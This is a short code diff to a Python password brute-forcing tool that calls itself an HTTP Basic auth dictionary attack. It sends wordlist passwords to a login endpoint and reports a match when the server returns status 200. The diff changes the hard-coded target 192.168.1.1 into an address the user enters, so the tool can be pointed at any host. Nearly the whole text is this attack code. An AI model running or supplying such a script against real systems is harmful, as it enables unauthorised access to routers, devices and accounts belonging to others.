@@ -6,7 +6,8 @@ import threading
 
 
 print("Welcome to HTTTPBasic auth dictionary attack")
-username = input("First: Do you have a username you want to try?")
+ipadr = input("Type the ip address: ")
+username = input("First: Do you have a username you want to try? ")
 
 start = time.time()
 #
@@ -24,7 +25,7 @@ while line:
     with ThreadPoolExecutor() as executor:
         line = f.readline()
         print("Line {}: {}".format(i, line.strip()))
-        r = requests.get('http://192.168.1.1', auth=HTTPBasicAuth('{}'.format(username.strip()), '{}'.format(line.strip())))
+        r = requests.get("http://"+ipadr, auth=HTTPBasicAuth('{}'.format(username.strip()), '{}'.format(line.strip())))
         i += 1
         if r.status_code == 200:
             print("Password found!")
